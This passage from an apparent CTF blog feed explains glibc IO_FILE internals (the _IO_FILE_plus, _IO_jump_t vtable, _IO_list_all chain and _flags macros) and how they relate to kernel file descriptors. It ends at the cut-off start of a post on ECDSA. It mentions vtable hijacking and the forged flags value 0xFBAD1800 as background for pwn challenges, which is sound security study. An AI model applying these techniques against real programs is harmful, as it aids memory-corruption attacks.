_vtable_offset; <span class="comment">// 虚函数表偏移量</span></span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];<span class="comment">// 短缓冲区(用于小量数据的快速操作)</span></span><br><span class="line">  _IO_lock_t *_lock;<span class="comment">// 文件锁(用于多线程环境下的文件流操作)</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>而<code>stdio、stdin、stderr</code>其实会通过<code>_chain</code>结构体指针使得这三个形成一个链表。先随便找一个能在<code>glibc2.23</code>能调试的程序，看看该libc版本的<code>IO_FILE</code></li><li>首先先确定<code>IO_list_all</code>的地址</li></ul><p><img src="/2025/07/19/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/PWN-IO-FILE%E5%9F%BA%E7%A1%80/image-20250720092240647.png" alt="image-20250720092240647"></p><ul><li>之后查看<code>_IO_list_all</code>所在地址的内存值，会很惊奇的发现这个<code>_IO_list_all</code>下面其实就是<code>_IO_2_1_stderr</code>，并且<code>_IO_list_all</code>所指向的就是<code>_IO_2_1_stderr</code>，<code>stderr</code>后面是<code>stdout</code>的结构体</li></ul><p><img src="/2025/07/19/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/PWN-IO-FILE%E5%9F%BA%E7%A1%80/image-20250720092525791.png" alt="image-20250720092525791"></p><ul><li>从调试中我们其实能看到<code>_IO_FILE_plus</code>结构体的总大小为<code>0xE0</code>，接下来说一下这些偏移。</li></ul><p><img src="/2025/07/19/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/PWN-IO-FILE%E5%9F%BA%E7%A1%80/image-20250720095933268.png" alt="image-20250720095933268"></p><ul><li>并且会发现<code>_IO_FILE *chain</code>指向的是<code>stdout</code>，这个<code>IO</code>结构体</li></ul><p><img src="/2025/07/19/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/PWN-IO-FILE%E5%9F%BA%E7%A1%80/image-20250720100059540.png" alt="image-20250720100059540"></p><p><img src="/2025/07/19/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/PWN-IO-FILE%E5%9F%BA%E7%A1%80/image-20250720100106833.png" alt="image-20250720100106833"></p><ul><li>并且在这俩个结构体下面还存在着俩个三个全局变量，分别指向着对应的<code>IO</code>结构体</li></ul><p><img src="/2025/07/19/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/PWN-IO-FILE%E5%9F%BA%E7%A1%80/image-20250720100234331.png" alt="image-20250720100234331"></p><ul><li>所以<code>IO</code>结构体有如下的逻辑结构</li></ul><p><img src="/2025/07/19/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/PWN-IO-FILE%E5%9F%BA%E7%A1%80/image-20250720100712798.png" alt="image-20250720100712798"></p><h2 id="_io_list_all结构体指针">_IO_list_all结构体指针</h2><ul><li>首先来看看<code>_IO_list_all</code>结构体指针的定义，它是一个<code>_IO_FILE_plus</code>结构体的指针：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> *_<span class="title">IO_list_all</span>;</span></span><br></pre></td></tr></table></figure><ul><li>其实<code>_IO_list_all</code>的作用相当于一个<strong>链表头</strong>，其指向的是<code>_IO_FILE_plus</code>结构体。该指针指向的是<code>_IO_FILE_plus</code>结构体链表的头结点。<code>_IO_list_all</code>与<code>stdin、stdout、stderr</code>三个<code>_IO_FILE_plus</code>结构体的结构如下图所示。</li></ul><p><img src="/2025/07/19/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/PWN-IO-FILE%E5%9F%BA%E7%A1%80/image-20250720100845207.png" alt="image-20250720100845207"></p><ul><li>当使用<code>fopen</code>打开一个文件的时候，堆上就会新出现一个<code>_IO_FILE_plus</code>结构体，而该结构体中的<code>_IO_FILE</code>结构体就会通过头插法插入到链表的开头。如下图所示：</li></ul><p><strong>注意：fopen打开的文件结构并没有一个全局变量指向新打开的IO_FILE，而是只有_IO_list_all将IO_FILE_plus构成链表</strong></p><p><img src="/2025/07/19/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/PWN-IO-FILE%E5%9F%BA%E7%A1%80/image-20250720101243101.png" alt="image-20250720101243101"></p><h2 id="_io_jump_t结构体">_IO_jump_t结构体</h2><ul><li><code>_IO_jump_t</code>结构体如下，其实这就是<code>_IO</code>的一个跳表，这个表里面保存的基本上都是函数指针，并且每个<code>IO_FILE_plus</code>这个结构体中的<code> const struct _IO_jump_t *vtable;</code>这个成员其实都是指向的<code>_IO_jump_t</code>这个结构体所在的位置。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JUMP_FILED()是一个宏定义</span></span><br><span class="line"><span class="comment">// 该宏定义是_IO_jump_t的主要成员</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP_FIELD(TYPE, NAME) TYPE NAME <span class="comment">// 其实就是简化声明,例如JUMP_FILED(int, count) 其实就是声明 int count </span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 在声明该跳表之前已经定义了好了函数指针,如下</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*_IO_finish_t)</span> <span class="params">(_IO_FILE *, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(*_IO_overflow_t)</span> <span class="params">(_IO_FILE *, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(*_IO_underflow_t)</span> <span class="params">(_IO_FILE *)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(*_IO_pbackfail_t)</span> <span class="params">(_IO_FILE *, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="keyword">typedef</span> _IO_size_t (*_IO_xsputn_t) (_IO_FILE *FP, <span class="type">const</span> <span class="type">void</span> *DATA,</span><br><span class="line">    _IO_size_t N);</span><br><span class="line"><span class="keyword">typedef</span> _IO_size_t (*_IO_xsgetn_t) (_IO_FILE *FP, <span class="type">void</span> *DATA, _IO_size_t N);</span><br><span class="line"><span class="keyword">typedef</span> _IO_off64_t (*_IO_seekoff_t) (_IO_FILE *FP, _IO_off64_t OFF, <span class="type">int</span> DIR,</span><br><span class="line">      <span class="type">int</span> MODE);</span><br><span class="line"><span class="keyword">typedef</span> _IO_off64_t (*_IO_seekpos_t) (_IO_FILE *, _IO_off64_t, <span class="type">int</span>);</span><br><span class="line"><span class="keyword">typedef</span> _IO_FILE* (*_IO_setbuf_t) (_IO_FILE *, <span class="type">char</span> *, _IO_ssize_t);</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(*_IO_sync_t)</span> <span class="params">(_IO_FILE *)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(*_IO_doallocate_t)</span> <span class="params">(_IO_FILE *)</span>;</span><br><span class="line"><span class="keyword">typedef</span> _IO_ssize_t (*_IO_read_t) (_IO_FILE *, <span class="type">void</span> *, _IO_ssize_t);</span><br><span class="line"><span class="keyword">typedef</span> _IO_ssize_t (*_IO_write_t) (_IO_FILE *, <span class="type">const</span> <span class="type">void</span> *, _IO_ssize_t);</span><br><span class="line"><span class="keyword">typedef</span> _IO_off64_t (*_IO_seek_t) (_IO_FILE *, _IO_off64_t, <span class="type">int</span>);</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(*_IO_close_t)</span> <span class="params">(_IO_FILE *)</span>; <span class="comment">/* finalize */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(*_IO_stat_t)</span> <span class="params">(_IO_FILE *, <span class="type">void</span> *)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(*_IO_showmanyc_t)</span> <span class="params">(_IO_FILE *)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*_IO_imbue_t)</span> <span class="params">(_IO_FILE *, <span class="type">void</span> *)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 该结构体定义了一套函数指针表,所以_IO_jump_t里面存储的,所以该结构体主要成员都是函数指针</span></span><br><span class="line"><span class="comment">// 都是函数指针那就很好了,在低版本中就有劫持_IO_FILE_plus中的vtable,从而触发一些函数指针</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);<span class="comment">// 声明变量size_t __dummy,占位符没实际功能</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);<span class="comment">// 声明变量size_t __dummy2,占位符没实际功能</span></span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);<span class="comment">// 声明函数指针_IO_finish_t __finish,完成操作的函数指针</span></span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);<span class="comment">// 写缓冲区溢出处理函数指针</span></span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);<span class="comment">// 读缓冲区欠载处理函数指针</span></span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);<span class="comment">// 读缓冲区欠载处理函数指针</span></span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);<span class="comment">// 处理推回字符的函数指针</span></span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);<span class="comment">// 写入多个字符的函数指针</span></span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);<span class="comment">// 读取多个字符的函数指针</span></span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);<span class="comment">// 按偏移量移动文件指针的函数指针</span></span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);<span class="comment">// 移动文件指针到指定位置的函数指针</span></span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);<span class="comment">// 设置缓冲区的函数指针</span></span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);<span class="comment">// 同步文件流的函数指针</span></span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);<span class="comment">// 分配缓冲区的函数指针</span></span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);<span class="comment">// 读取数据的函数指针</span></span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);<span class="comment">// 写入数据的函数指针</span></span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);<span class="comment">// 移动文件的函数指针</span></span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);<span class="comment">// 关闭文件的函数指针</span></span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);<span class="comment">// 获取文件状态的函数指针</span></span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);<span class="comment">// 显示可用字符数的函数指针</span></span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);<span class="comment">// 设置区域设置信息的函数指针</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>所以对于<code>stdio、stdin、stderr</code>这三个更加详细的逻辑结构是如下图所示的</li></ul><p><img src="/2025/07/19/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/PWN-IO-FILE%E5%9F%BA%E7%A1%80/image-20250720104635197.png" alt="image-20250720104635197"></p><h2 id="io_file成员_flags">IO_FILE成员_flags</h2><ul><li>对于伪造<code>IO_FILE</code>首先就是要伪造<code>_flags</code>，该结构体中的成员<code>_flags</code>会有个<code>magic</code>标识该结构体是<code>IO_FILE</code>结构体，如果<code>magic</code>不匹配会导致程序崩溃等，就不能达到伪造<code>IO</code>的目的了。</li><li>接下来介绍一下<code>_flags</code>相关的宏定义,其实伪造<code>_flags</code>就将其伪造成（如果是stdout或者一些输出函数）<code>0xFBAD1800</code>即<code>_IO_MAGIC | _IO_IS_APPENDING | _IO_CURRENTLY_PUTTING</code>：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC 0xFBAD0000           <span class="comment">/* Magic number 文件结构体的魔数，用于标识文件结构体的有效性 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _OLD_STDIO_MAGIC 0xFABC0000    <span class="comment">/* Emulate old stdio 模拟旧的标准输入输出库（stdio）行为的魔数 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC_MASK 0xFFFF0000      <span class="comment">/* Magic mask 魔数掩码，用于从 _flags 变量中提取魔数部分 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_BUF 1                 <span class="comment">/* User owns buffer; don&#x27;t delete it on close. 用户拥有缓冲区，不在关闭时删除缓冲区 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_UNBUFFERED 2               <span class="comment">/* Unbuffered 无缓冲模式，直接进行I/O操作，不使用缓冲区 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_READS 4                 <span class="comment">/* Reading not allowed 不允许读取操作 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_WRITES 8                <span class="comment">/* Writing not allowed 不允许写入操作 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_EOF_SEEN 0x10              <span class="comment">/* EOF seen 已经到达文件结尾（EOF） */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_ERR_SEEN 0x20              <span class="comment">/* Error seen 已经发生错误 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_DELETE_DONT_CLOSE 0x40     <span class="comment">/* Don&#x27;t call close(_fileno) on cleanup. 不关闭文件描述符 _fileno，在清理时不调用 close 函数 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINKED 0x80                <span class="comment">/* Set if linked (using _chain) to streambuf::_list_all. 链接到一个链表（使用 _chain 指针），用于 streambuf::_list_all */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IN_BACKUP 0x100            <span class="comment">/* In backup 处于备份模式 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINE_BUF 0x200             <span class="comment">/* Line buffered 行缓冲模式，在输出新行时刷新缓冲区 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_TIED_PUT_GET 0x400         <span class="comment">/* Set if put and get pointer logically tied. 在输出和输入指针逻辑上绑定时设置 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x800    <span class="comment">/* Currently putting 当前正在执行 put 操作 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_APPENDING 0x1000        <span class="comment">/* Is appending 处于附加模式（在文件末尾追加内容） */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_FILEBUF 0x2000          <span class="comment">/* Is file buffer 是一个文件缓冲区 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_BAD_SEEN 0x4000            <span class="comment">/* Bad seen 遇到错误（bad flag set） */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_LOCK 0x8000           <span class="comment">/* User lock 用户锁定，防止其他线程访问 */</span></span></span><br></pre></td></tr></table></figure><h1 id="io_file与文件描述符">IO_FILE与文件描述符</h1><ul><li><p>初步了解了<code>IO_FILE</code>的一些知识后，会联想到<code>IO_FILE_plus</code>一开始在进程中其实就是有<code>3</code>个对应的分别就是<code>stdin</code>、<code>stdout</code>、<code>stderr</code>。而在操作系统文件描述符中<code>0</code>表示着<code>stdin</code>，<code>1</code>表示着<code>stdout</code>，<code>2</code>表示着<code>stderr</code>。</p></li><li><p>此时就会不禁猜想<code>文件描述符</code>是不是也与<code>IO_FILE_plus</code>有一定的关系呢？接下来详细说明一下<code>IO_FILE</code>与文件描述符对应的关系。</p></li><li><p><code>IO_FILE</code>与<code>文件描述符</code>在不同的层面：</p><ul><li><code>fd</code>文件描述符是内核级别的整数编号，代表打开的文件。</li><li><code>_IO_FILE</code>是<code>glibc</code>用户空间中封装结构，代表<code>C</code>层面的流。</li><li><code>_IO_FILE</code>与<code>进程中的struct files_struct</code>的联系其实就是<code>fd</code>文件描述符，<code>fd</code>文件描述符起始相当于<code>offset偏移</code></li></ul></li><li><p>进程中有一个<code>struct files_struct</code>，在这个结构体内有一个数组<code>struct file* fd_array[]</code></p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义在linux内核源码/include/linux/fdtable.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> &#123;</span></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * read mostly part</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"><span class="type">atomic_t</span> count;</span><br><span class="line"><span class="type">bool</span> resize_in_progress;</span><br><span class="line"><span class="type">wait_queue_head_t</span> resize_wait;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> __<span class="title">rcu</span> *<span class="title">fdt</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> <span class="title">fdtab</span>;</span></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * written part on a separate cache line in SMP</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"><span class="type">spinlock_t</span> file_lock ____cacheline_aligned_in_smp;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> next_fd;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> close_on_exec_init[<span class="number">1</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> open_fds_init[<span class="number">1</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> full_fds_bits_init[<span class="number">1</span>];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> __<span class="title">rcu</span> * <span class="title">fd_array</span>[<span class="title">NR_OPEN_DEFAULT</span>];</span></span><br><span class="line">    <span class="comment">// 文件描述符对应的就是fd_array[]这个数组的索引值.这个数组其实是一个指针数组</span></span><br><span class="line">    <span class="comment">// 例如: fd_array[0]对应的就是fd=0,即stdin</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>其中<code>struct file</code>结构体如下：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// struct file的结构体定义在linux内核源码/include/linux/fs.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">llist_node</span><span class="title">fu_llist</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">fu_rcuhead</span>;</span></span><br><span class="line">&#125; f_u;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">path</span><span class="title">f_path</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span>*<span class="title">f_inode</span>;</span><span class="comment">/* cached value */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>*<span class="title">f_op</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Protects f_ep_links, f_flags.</span></span><br><span class="line"><span class="comment"> * Must not be taken from IRQ context.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">spinlock_t</span>f_lock;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">rw_hint</span><span class="title">f_write_hint</span>;</span></span><br><span class="line"><span class="type">atomic_long_t</span>f_count;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> f_flags;</span><br><span class="line"><span class="type">fmode_t</span>f_mode;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span><span class="title">f_pos_lock</span>;</span></span><br><span class="line"><span class="type">loff_t</span>f_pos;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fown_struct</span><span class="title">f_owner</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span>*<span class="title">f_cred</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_ra_state</span><span class="title">f_ra</span>;</span></span><br><span class="line"></span><br><span class="line">u64f_version;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="type">void</span>*f_security;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">/* needed for tty driver, and maybe others */</span></span><br><span class="line"><span class="type">void</span>*private_data;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_EPOLL</span></span><br><span class="line"><span class="comment">/* Used by fs/eventpoll.c to link all the hooks to this file */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">f_ep_links</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">f_tfile_llink</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* #ifdef CONFIG_EPOLL */</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>*<span class="title">f_mapping</span>;</span></span><br><span class="line"><span class="type">errseq_t</span>f_wb_err;</span><br><span class="line"><span class="type">errseq_t</span>f_sb_err; <span class="comment">/* for syncfs */</span></span><br><span class="line">&#125; __randomize_layout</span><br><span class="line">  __attribute__((aligned(<span class="number">4</span>)));<span class="comment">/* lest something weird decides that 2 is OK */</span></span><br></pre></td></tr></table></figure><ul><li>这俩者的联系如下图所示：<ul><li>用户层面<code>_IO_FILE</code>其实是在用户空间中管理文件输入输出的一个高层封装，当文件内容被载入到虚拟内存空间中对这个缓冲区的操作。</li><li>而内核态中的<code>struct file</code>，描述的是一个正在的打开文件，能访问底层硬件即磁盘。</li><li>并且多个进程如果打开同一个文件，在内核态也只存在着一个<code>struct file</code>结构体</li></ul></li></ul><p><img src="/2025/07/19/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/PWN-IO-FILE%E5%9F%BA%E7%A1%80/image-20250720124159746.png" alt="image-20250720124159746"></p><p><img src="/2025/07/19/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/PWN-IO-FILE%E5%9F%BA%E7%A1%80/image-20250720124240918.png" alt="image-20250720124240918"></p>]]></content>
    
    
    <summary type="html">前言：唉,高版本glibc利用过不去的坎</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>椭圆曲线数字签名ECDS</title>
    <link href="http://iyheart.github.io/2025/07/17/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%E7%AE%97%E6%B3%95/"/>
    <id>http://iyheart.github.io/2025/07/17/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%E7%AE%97%E6%B3%95/</id>
    <published>2025-07-17T14:22:04.000Z</published>
    <updated>2025-08-08T15:47:29.185Z</updated>
    
    <content type="html"><![CDATA[<p>参考博客：<a href="https://hasegawaazusa.github.io/">独奏の小屋</a></p><p>参考博客：Coder小Q</p><p><img src="/2025/07/17/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%E7%AE%97%E6%B3%95/image-20250717225013460.png" alt="image-20250717225013460"></p><h1 id="ecdsa">ECDSA</h1><p><strong>椭圆曲线数字签名算法(Elliptic Cureve Digital Signature Algorithm，简称ECDSA)</strong>，是一种基于椭圆曲线密码学的公开密钥加密算法。1985年，<code>Koblitz</code>和<code>Miller</code>这两个人把<strong>数字签名算法</strong>移植到<strong>椭圆曲线</strong>上，椭圆曲线数字签名算法由此诞生。</p><p>其中<code>ECDSA</code>这个椭圆曲线数字签名算法是目前最常用的椭圆曲线数字签名算法，最近的密码题中也经常出现<code>ECDSA</code>这个考点(<strong>好像都是在随机数<code>k</code>这边做文章</strong>)。</p><h2 id="签名过程">签名过程</h2><ul><li>先确定一个椭圆曲线，以及求得该椭圆曲线的阶<code>n</code>和基点<code>G</code>：</li></ul><p>$$<br>y^2 \equiv x^3+ax+b ~mod(~p)\<br>n*G = 